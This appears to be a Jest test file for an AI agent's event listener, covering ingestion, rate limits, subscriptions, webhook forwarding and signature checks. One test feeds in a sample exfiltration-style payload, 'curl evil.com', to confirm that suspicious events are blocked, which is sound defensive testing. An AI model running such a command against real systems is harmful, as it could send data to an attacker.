/**
 * @fileOverview Tests for Event Listener
 *
 * Tests event listener functionality including:
 * - Event ingestion
 * - Subscription management
 * - Event processing
 * - Rate limiting
 * - Signature validation
 */

// Mock logger
jest.mock('../../logger', () => ({
  MollyLogger: {
    info: jest.fn(),
    warn: jest.fn(),
    error: jest.fn(),
    debug: jest.fn(),
  },
}));

// Mock stranger-danger (social immune system)
jest.mock('../stranger-danger', () => ({
  SocialImmuneSystem: {
    analyzeIntent: jest.fn().mockReturnValue({
      frequency: 'resonant',
      reason: 'Appears safe',
      flaggedPatterns: [],
    }),
  },
}));

// Mock consciousness
jest.mock('@/ai/consciousness', () => ({
  getConsciousness: jest.fn().mockReturnValue({
    queueMessage: jest.fn(),
  }),
}));

// Mock terminal
jest.mock('@/ai/terminal', () => ({
  getPolyglotRuntime: jest.fn().mockReturnValue({
    execute: jest
      .fn()
      .mockResolvedValue({ exitCode: 0, stdout: 'ok', stderr: '' }),
  }),
  getMollyShell: jest.fn().mockReturnValue({
    isAlive: jest.fn().mockReturnValue(true),
    start: jest.fn(),
    execute: jest
      .fn()
      .mockResolvedValue({ exitCode: 0, stdout: 'ok', stderr: '' }),
  }),
}));

// Mock fetch
global.fetch = jest.fn().mockResolvedValue({
  ok: true,
  text: jest.fn().mockResolvedValue('OK'),
}) as jest.Mock;

import { EventListener, getEventListener } from '../event-listener';
import { SocialImmuneSystem } from '../stranger-danger';
import { getConsciousness } from '@/ai/consciousness';

describe('EventListener', () => {
  let listener: EventListener;

  beforeEach(() => {
    listener = new EventListener();
    jest.clearAllMocks();
    // Reset env
    delete process.env.MOLLY_WEBHOOK_SECRET;
  });

  describe('Event Ingestion', () => {
    it('receives event with all fields', async () => {
      const event = await listener.receive({
        source: 'webhook',
        sourceId: 'github',
        type: 'push',
        payload: { ref: 'refs/heads/main' },
        priority: 'normal',
      });

      expect(event.id).toContain('evt-');
      expect(event.source).toBe('webhook');
      expect(event.sourceId).toBe('github');
      expect(event.type).toBe('push');
      expect(event.receivedAt).toBeDefined();
    });

    it('defaults priority to normal', async () => {
      const event = await listener.receive({
        source: 'internal',
        sourceId: 'system',
        type: 'test',
        payload: {},
      });

      expect(event.priority).toBe('normal');
    });

    it('rejects oversized payloads', async () => {
      const largePayload = { data: 'x'.repeat(70000) };

      await expect(
        listener.receive({
          source: 'webhook',
          sourceId: 'attacker',
          type: 'malicious',
          payload: largePayload,
        })
      ).rejects.toThrow('payload too large');
    });

    it('runs social immune system check', async () => {
      await listener.receive({
        source: 'webhook',
        sourceId: 'github',
        type: 'push',
        payload: { action: 'opened' },
      });

      expect(SocialImmuneSystem.analyzeIntent).toHaveBeenCalled();
    });

    it('blocks dissonant events', async () => {
      (SocialImmuneSystem.analyzeIntent as jest.Mock).mockReturnValueOnce({
        frequency: 'dissonant',
        reason: 'Suspicious pattern detected',
        flaggedPatterns: ['exfiltration'],
      });

      const event = await listener.receive({
        source: 'webhook',
        sourceId: 'attacker',
        type: 'suspicious',
        payload: { cmd: 'curl evil.com' },
      });

      // Event should be marked as processed but not trigger subscriptions
      expect(event.processed).toBe(true);
    });
  });

  describe('Rate Limiting', () => {
    it('allows events within rate limit', async () => {
      for (let i = 0; i < 5; i++) {
        await listener.receive({
          source: 'webhook',
          sourceId: 'test-source',
          type: `event-${i}`,
          payload: {},
        });
      }

      // Should succeed
      const events = listener.getEvents({ sourceId: 'test-source' });
      expect(events.length).toBe(5);
    });

    it('rejects events exceeding rate limit', async () => {
      // Fill up rate limit (30 per minute)
      for (let i = 0; i < 30; i++) {
        await listener.receive({
          source: 'webhook',
          sourceId: 'rate-test',
          type: `event-${i}`,
          payload: {},
        });
      }

      // 31st should fail
      await expect(
        listener.receive({
          source: 'webhook',
          sourceId: 'rate-test',
          type: 'one-more',
          payload: {},
        })
      ).rejects.toThrow('Rate limit exceeded');
    });
  });

  describe('Subscription Management', () => {
    it('creates subscription', () => {
      const sub = listener.subscribe({
        name: 'GitHub Pushes',
        sourceFilter: 'webhook',
        sourceIdPattern: 'github*',
        typePattern: 'push',
        action: { type: 'log' },
      });

      expect(sub.id).toContain('sub-');
      expect(sub.name).toBe('GitHub Pushes');
      expect(sub.enabled).toBe(true);
      expect(sub.triggerCount).toBe(0);
    });

    it('unsubscribes', () => {
      const sub = listener.subscribe({
        name: 'Test Sub',
        typePattern: 'test*',
        action: { type: 'log' },
      });

      expect(listener.unsubscribe(sub.id)).toBe(true);
      expect(
        listener.getSubscriptions().find((s) => s.id === sub.id)
      ).toBeUndefined();
    });

    it('returns false for nonexistent unsubscribe', () => {
      expect(listener.unsubscribe('nonexistent')).toBe(false);
    });

    it('throws when max subscriptions reached', () => {
      for (let i = 0; i < 50; i++) {
        listener.subscribe({
          name: `Sub ${i}`,
          typePattern: `type-${i}`,
          action: { type: 'log' },
        });
      }

      expect(() => {
        listener.subscribe({
          name: 'One more',
          typePattern: 'test',
          action: { type: 'log' },
        });
      }).toThrow('Maximum subscription limit');
    });
  });

  describe('Event Processing', () => {
    it('matches subscription and triggers action', async () => {
      listener.subscribe({
        name: 'Log All',
        typePattern: '*',
        action: { type: 'log' },
      });

      const event = await listener.receive({
        source: 'internal',
        sourceId: 'test',
        type: 'test-event',
        payload: { data: 'hello' },
      });

      expect(event.processed).toBe(true);
    });

    it('matches source filter', async () => {
      const sub = listener.subscribe({
        name: 'Webhooks Only',
        sourceFilter: 'webhook',
        typePattern: '*',
        action: { type: 'log' },
      });

      await listener.receive({
        source: 'webhook',
        sourceId: 'github',
        type: 'event',
        payload: {},
      });

      expect(
        listener.getSubscriptions().find((s) => s.id === sub.id)?.triggerCount
      ).toBe(1);

      await listener.receive({
        source: 'internal',
        sourceId: 'system',
        type: 'event',
        payload: {},
      });

      // Should not have triggered
      expect(
        listener.getSubscriptions().find((s) => s.id === sub.id)?.triggerCount
      ).toBe(1);
    });

    it('matches sourceId pattern with wildcard', async () => {
      const sub = listener.subscribe({
        name: 'GitHub Sources',
        sourceIdPattern: 'github*',
        typePattern: '*',
        action: { type: 'log' },
      });

      await listener.receive({
        source: 'webhook',
        sourceId: 'github-actions',
        type: 'workflow',
        payload: {},
      });

      expect(
        listener.getSubscriptions().find((s) => s.id === sub.id)?.triggerCount
      ).toBe(1);

      await listener.receive({
        source: 'webhook',
        sourceId: 'gitlab',
        type: 'workflow',
        payload: {},
      });

      // Should not match
      expect(
        listener.getSubscriptions().find((s) => s.id === sub.id)?.triggerCount
      ).toBe(1);
    });

    it('matches type pattern', async () => {
      const sub = listener.subscribe({
        name: 'Push Events',
        typePattern: 'push*',
        action: { type: 'log' },
      });

      await listener.receive({
        source: 'webhook',
        sourceId: 'github',
        type: 'push',
        payload: {},
      });

      await listener.receive({
        source: 'webhook',
        sourceId: 'github',
        type: 'push-notification',
        payload: {},
      });

      expect(
        listener.getSubscriptions().find((s) => s.id === sub.id)?.triggerCount
      ).toBe(2);
    });

    it('notifies consciousness for high-priority unhandled events', async () => {
      const consciousness = getConsciousness();

      await listener.receive({
        source: 'system',
        sourceId: 'alert',
        type: 'critical-failure',
        payload: { message: 'Database down' },
        priority: 'critical',
      });

      expect(consciousness.queueMessage).toHaveBeenCalledWith(
        expect.objectContaining({
          type: 'observation',
          priority: 'high',
        })
      );
    });

    it('executes consciousness action', async () => {
      const consciousness = getConsciousness();

      listener.subscribe({
        name: 'Notify Consciousness',
        typePattern: 'notify*',
        action: {
          type: 'consciousness',
          messageTemplate: 'Received event: {{event.type}}',
        },
      });

      await listener.receive({
        source: 'internal',
        sourceId: 'test',
        type: 'notify-test',
        payload: {},
      });

      expect(consciousness.queueMessage).toHaveBeenCalled();
    });

    it('executes webhook-forward action', async () => {
      listener.subscribe({
        name: 'Forward Webhooks',
        typePattern: 'forward*',
        action: {
          type: 'webhook-forward',
          forwardUrl: 'https://external.service/webhook',
        },
      });

      await listener.receive({
        source: 'internal',
        sourceId: 'test',
        type: 'forward-this',
        payload: { data: 'test' },
      });

      expect(fetch).toHaveBeenCalledWith(
        'https://external.service/webhook',
        expect.objectContaining({
          method: 'POST',
        })
      );
    });
  });

  describe('Event Query', () => {
    it('gets all events', async () => {
      await listener.receive({
        source: 'internal',
        sourceId: 'a',
        type: 't1',
        payload: {},
      });
      await listener.receive({
        source: 'internal',
        sourceId: 'b',
        type: 't2',
        payload: {},
      });

      const events = listener.getEvents();
      expect(events.length).toBe(2);
    });

    it('filters by source', async () => {
      await listener.receive({
        source: 'webhook',
        sourceId: 'a',
        type: 't',
        payload: {},
      });
      await listener.receive({
        source: 'internal',
        sourceId: 'b',
        type: 't',
        payload: {},
      });

      const events = listener.getEvents({ source: 'webhook' });
      expect(events.length).toBe(1);
      expect(events[0].source).toBe('webhook');
    });

    it('filters by sourceId', async () => {
      await listener.receive({
        source: 'webhook',
        sourceId: 'github',
        type: 't',
        payload: {},
      });
      await listener.receive({
        source: 'webhook',
        sourceId: 'gitlab',
        type: 't',
        payload: {},
      });

      const events = listener.getEvents({ sourceId: 'github' });
      expect(events.length).toBe(1);
    });

    it('filters by type pattern', async () => {
      await listener.receive({
        source: 'internal',
        sourceId: 'a',
        type: 'push',
        payload: {},
      });
      await listener.receive({
        source: 'internal',
        sourceId: 'b',
        type: 'pull',
        payload: {},
      });

      const events = listener.getEvents({ type: 'push' });
      expect(events.length).toBe(1);
    });

    it('respects limit', async () => {
      for (let i = 0; i < 10; i++) {
        await listener.receive({
          source: 'internal',
          sourceId: 'x',
          type: `t${i}`,
          payload: {},
        });
      }

      const events = listener.getEvents({ limit: 3 });
      expect(events.length).toBe(3);
    });
  });

  describe('Statistics', () => {
    it('returns stats', async () => {
      await listener.receive({
        source: 'internal',
        sourceId: 'a',
        type: 't1',
        payload: {},
      });
      listener.subscribe({
        name: 'Test',
        typePattern: '*',
        action: { type: 'log' },
      });

      const stats = listener.getStats();
      expect(stats.totalReceived).toBeGreaterThanOrEqual(1);
      expect(stats.subscriptionCount).toBe(1);
    });
  });

  describe('Summary', () => {
    it('returns empty summary', () => {
      const summary = listener.getSummary();
      expect(summary).toContain('no events received');
    });

    it('returns summary with data', async () => {
      await listener.receive({
        source: 'internal',
        sourceId: 'a',
        type: 't',
        payload: {},
      });
      listener.subscribe({
        name: 'Test Sub',
        typePattern: '*',
        action: { type: 'log' },
      });

      const summary = listener.getSummary();
      expect(summary).toContain('received');
      expect(summary).toContain('Test Sub');
    });
  });

  describe('Persistence', () => {
    it('serializes subscriptions', () => {
      listener.subscribe({
        name: 'Persistent',
        typePattern: 'test*',
        action: { type: 'log' },
      });

      const serialized = listener.serializeSubscriptions();
      expect(serialized.length).toBe(1);
      expect(serialized[0].name).toBe('Persistent');
    });

    it('restores subscriptions', () => {
      const newListener = new EventListener();
      newListener.restoreSubscriptions([
        {
          id: 'sub-restored',
          name: 'Restored Sub',
          typePattern: 'restored*',
          action: { type: 'log' },
          enabled: true,
          createdBy: 'system',
          createdAt: new Date().toISOString(),
          triggerCount: 10,
        },
      ]);

      const subs = newListener.getSubscriptions();
      expect(subs.length).toBe(1);
      expect(subs[0].triggerCount).toBe(10);
    });
  });

  describe('Webhook Secrets', () => {
    it('sets and uses webhook secret', async () => {
      listener.setWebhookSecret('github', 'secret123');

      // Valid signature
      const payload = JSON.stringify({ test: true });
      const crypto = await import('node:crypto');
      const sig = `sha256=${crypto.createHmac('sha256', 'secret123').update(payload).digest('hex')}`;

      const event = await listener.receive({
        source: 'webhook',
        sourceId: 'github',
        type: 'push',
        payload: { test: true },
        signature: sig,
      });

      expect(event.id).toBeDefined();
    });

    it('rejects invalid signature', async () => {
      listener.setWebhookSecret('github', 'secret123');

      await expect(
        listener.receive({
          source: 'webhook',
          sourceId: 'github',
          type: 'push',
          payload: { test: true },
          signature: 'sha256=invalid',
        })
      ).rejects.toThrow('Invalid webhook signature');
    });
  });

  describe('Singleton', () => {
    it('returns same instance', () => {
      const l1 = getEventListener();
      const l2 = getEventListener();
      expect(l1).toBe(l2);
    });
  });
});
